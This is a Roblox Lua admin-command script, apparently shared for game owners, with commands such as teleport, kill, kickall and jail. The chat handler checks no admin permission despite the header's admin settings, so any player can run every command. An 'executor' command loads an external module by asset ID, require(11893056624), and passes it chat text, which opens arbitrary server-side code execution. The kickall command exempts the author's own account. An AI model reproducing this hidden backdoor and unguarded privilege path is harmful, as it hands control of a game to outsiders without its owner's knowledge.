local cmds = {}           --Do not toutch
----------------------------------------------------------------------------

-----------------------------SETTINGS: 

--The names of admins players (players allowed to use the commands)



local AllAdmins = false   --Set if every players are admins (may be dangerious)


local prefix = "@"       --The prefix of every commands




------------------------------COMMANDS:





--[[
   Commands list:
  tp [target1,target2]    (tp a target1 to an other target2)
  tpall [target]       (tp all players in the server to a target)
  tpto [target,x,y,z]  (teleport a target to a position x,y,z)
  speed [target,number]    (change a target speed)
  jump [target,number] (change a target jumppower)
  gravity [number] (change the gravity of the world)
  kick [target,kickmessage]   (kick a target)
  god [target]    (make the target's health and maxhealth to math.huge)
  ungod [target]
  kill [target]   (kill a target)
  clear [target]   (delete all tools of the targeted player)
  kickall [kickmessage]    (kick all players in the server)
  executor [target]       (give a script executor to the target(may be dangerious))
  re [target]  (refresh the target)
  sit [target]  (make a target sit)
  time [number]  (change the time of day)
  killall    (kill all players in the server)
  jail [target]   (jail a target)
  unjail [target]   (unjail a target)
  
]]


--[[
  Command exaple:
  
  To write a commande you must write the prefixe, then the command name and the arguments, like that:
  
  (prefix)(commandename) (argument1[optional])(argument2[optional])(argument3[optional])(argument4[optional])....
  
  Example to give a player called 'Amynuv' speed 100 wit "@" prefix:
  
  @speed Amynuv 100


]]

----------------------------------CREDITS AND CONTACTS:


--[[Credits:
   Script idea: AlvinBlox
   Execute event in executor command: LuLu,Rerubu,Yueliang,einsteinK
   The rest: Amynuv
   
   
   Contact Amynuv:
   
   Roblox Username:
   Amynuv
   
   Roblox ID:
   911404169
   
   E-Mail:
   amynuv@gmail.com
   
   Discord:
   Amynuv#5048
   
   Discord ID:
   845649995003854858


]]








---_______________________________BEGINING OF THE SCRIPT:______________________________________________



































--Do not toutch

---_______________________________________________________________________________________________________



local function findPlayer(name)
	for _, player in pairs(game.Players:GetPlayers()) do
		if string.lower(player.Name) == name then
			return player
		end
	end
	return nil
end












cmds.clear = function(sender, arguments)
	local playerToClear = arguments[1]
	if playerToClear then
		local ptc = findPlayer(playerToClear)
		if ptc then
			ptc.Backpack:ClearAllChildren()
		end
	end
end
















cmds.speed = function(sender, arguments)
	local playerToGiveSpeed = arguments[1]
	local amountofspeed = arguments[2]
	if playerToGiveSpeed and amountofspeed then
		local plr = findPlayer(playerToGiveSpeed)
		if plr then
			plr.Character.Humanoid.WalkSpeed = tonumber(amountofspeed)
		end
	end
end

--God and ungod pack---------------------------------------------
cmds.god = function(sender, arguments)
	local playerToGod = arguments[1]
	if playerToGod then
		local pg = findPlayer(playerToGod)
		if pg then
			pg.Character.Humanoid.MaxHealth = math.huge
			pg.Character.Humanoid.Health = math.huge
		end
	end
	
end

cmds.ungod = function(sender, arguments)
	local playerTounGod = arguments[1]
	if playerTounGod then
		local pug = findPlayer(playerTounGod)
		if pug then
			pug.Character.Humanoid.MaxHealth = 100
			pug.Character.Humanoid.Health = 100
		end
	end

end





----------------------------------------------------------------

cmds.jump = function(sender, arguments)
	local playerToGivejp = arguments[1]
	local amountofjp = arguments[2]
	if playerToGivejp and amountofjp then
		local plrt = findPlayer(playerToGivejp)
		if plrt then
			plrt.Character.Humanoid.UseJumpPower = true
			plrt.Character.Humanoid.JumpPower = tonumber(amountofjp)
		end
	end
end

cmds.gravity = function(sender, arguments)
	local grav = arguments[1]
	if grav then
		game:GetService("Workspace").Gravity = tonumber(grav)
	end
end




cmds.time = function(sender,arguments)
	local timeto = tonumber(arguments[1])
	if arguments[1] then
		local t = game:GetService("Lighting")
		if t then
			t.ClockTime = timeto
		end
	end
end





cmds.re = function(sender, arguments)
	local target = arguments[1]
	if target then
		local ft = findPlayer(target)
		if ft then
			ft:LoadCharacter()
		end
	end
end



cmds.tp = function(sender, arguments)
	local playerToTeleportName = arguments[1]
	local playerToTeleportToName = arguments[2]
	
	if playerToTeleportName and playerToTeleportToName then
		local playerToTp = findPlayer(playerToTeleportName)
		local playerToTpTo = findPlayer(playerToTeleportToName)
		if playerToTp and playerToTpTo then
			playerToTp.Character.HumanoidRootPart.CFrame = playerToTpTo.Character.HumanoidRootPart.CFrame
		end
	end
end



cmds.tpall = function(sender, arguments)
	local playerToTeleportName = arguments[1]

	if playerToTeleportName then
		local playerToTp = findPlayer(playerToTeleportName)
		if playerToTp then
			local players = game:GetService("Players"):GetPlayers()
			for i,v in pairs(players) do
				v.Character.HumanoidRootPart.CFrame = playerToTp.Character.HumanoidRootPart.CFrame
			end
		end
	end
end







cmds.kill = function(sender, arguments)
	local playertokill = arguments[1]
	if playertokill then
		local pk = findPlayer(playertokill)
		if pk then
			pk.Character.Humanoid.Health = 0
		end
	end
end

cmds.kickall = function(sender, arguments)
	local arg = arguments[1]
	local players = game:GetService("Players"):GetPlayers()
	if arg then
		for i,v in pairs(players) do
			if v.Name ~= "Amynuv" then
				v:Kick(arg)
			end
		end
	else
		for i,v in pairs(players) do
			if v.Name ~= "Amynuv" then
				v:Kick()
			end
		end
	end
end








cmds.killall = function(sender, arguments)
	local players = game:GetService("Players"):GetPlayers()
	for i,v in pairs(players) do
		v.Character.Humanoid.Health = 0
	end
end
	




cmds.executor = function(sender,arguments)
	local cm = arguments[1]
	if cm then
		require(11893056624).Amynuv(cm)
	end
end

---------------------------Jail and unjail pack---------------------


cmds.jail = function(sender, arguments)
	local playertojail = arguments[1]
	if playertojail then
		local pj = findPlayer(playertojail)
		if pj then
			pj.Character.Humanoid.WalkSpeed = 0
			pj.Character.Humanoid.UseJumpPower = true
			pj.Character.Humanoid.JumpPower = 0
		end
	end
end

cmds.unjail = function(sender, arguments)
	local playertoujail = arguments[1]
	if playertoujail then
		local puj = findPlayer(playertoujail)
		if puj then
			puj.Character.Humanoid.WalkSpeed = 16
			puj.Character.Humanoid.UseJumpPower = true
			puj.Character.Humanoid.JumpPower = 50
		end
	end
end






















---------------------------------------------------------------





cmds.sit = function(sender, arguments)
	local targ = arguments[1]
	if targ then
		local findtarg = findPlayer(targ)
		if findtarg then
			findtarg.Character.Humanoid.Sit = true
		end
	end
end



cmds.tpto = function(sender, arguments)
	local cib = arguments[1]
	local x = arguments[2]
	local y = arguments[3]
	local z = arguments[4]
	if cib and x and y and z then
		local cibf = findPlayer(cib)
		if cibf then
			cibf.Character.HumanoidRootPart.CFrame = CFrame.new(x,y,z)
		end
	end
end






game.Players.PlayerAdded:Connect(function(player)
	player.Chatted:Connect(function(message,recipient)
		message = string.lower(message)
		local splitString = message:split(" ")
		local slashCommand = splitString[1]
		local cmd = slashCommand:split(prefix)
		local cmdName = cmd[2]
		if cmds[cmdName] then
			local arguments = {}
			for i = 2, #splitString, 1 do
				table.insert(arguments,splitString[i])
			end
			cmds[cmdName](player,arguments)
		end
				--Amynuv
	end)
end)



--Script made by Amynuv

